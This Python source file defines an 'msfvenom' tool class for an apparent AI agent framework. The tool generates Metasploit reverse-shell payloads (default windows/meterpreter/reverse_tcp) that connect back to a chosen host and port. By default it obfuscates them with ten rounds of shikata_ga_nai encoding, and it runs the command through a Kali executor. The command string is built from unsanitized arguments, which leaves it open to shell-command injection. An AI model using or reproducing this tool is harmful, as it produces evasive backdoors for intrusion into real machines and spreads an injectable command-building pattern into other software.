from app.services.ai.tools.base import BaseTool, ToolParameter, ToolResult
from typing import List, Dict, Any
import asyncio

class MsfvenomTool(BaseTool):
    def get_name(self) -> str:
        return "msfvenom"
    
    def get_description(self) -> str:
        return "Generate Metasploit payloads with encoding and obfuscation"
    
    def get_category(self) -> str:
        return "exploitation"
    
    def get_parameters(self) -> List[ToolParameter]:
        return [
            ToolParameter(
                name="payload",
                type="string",
                description="Payload type (e.g., windows/meterpreter/reverse_tcp)",
                required=True
            ),
            ToolParameter(
                name="lhost",
                type="string",
                description="Local host IP for reverse connection",
                required=True
            ),
            ToolParameter(
                name="lport",
                type="integer",
                description="Local port for reverse connection",
                required=True
            ),
            ToolParameter(
                name="format",
                type="string",
                description="Output format (exe, elf, raw, python, powershell)",
                required=False
            ),
            ToolParameter(
                name="encoder",
                type="string",
                description="Encoder to use (x86/shikata_ga_nai, x64/xor)",
                required=False
            ),
            ToolParameter(
                name="iterations",
                type="integer",
                description="Number of encoding iterations",
                required=False
            )
        ]
    
    async def execute(self, **kwargs) -> ToolResult:
        payload = kwargs.get("payload", "windows/meterpreter/reverse_tcp")
        lhost = kwargs.get("lhost")
        lport = kwargs.get("lport", 4444)
        format_type = kwargs.get("format", "exe")
        encoder = kwargs.get("encoder", "x86/shikata_ga_nai")
        iterations = kwargs.get("iterations", 10)
        
        # Build msfvenom command
        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format_type}"
        
        if encoder:
            cmd += f" -e {encoder} -i {iterations}"
        
        try:
            # Execute via KaliExecutor
            from app.services.kali_executor import kali_executor
            result = await kali_executor.execute(cmd)
            
            return ToolResult(
                success=True,
                output=result.get("output", ""),
                data={
                    "payload": payload,
                    "lhost": lhost,
                    "lport": lport,
                    "format": format_type,
                    "encoder": encoder,
                    "command": cmd
                }
            )
        except Exception as e:
            return ToolResult(
                success=False,
                error=str(e)
            )
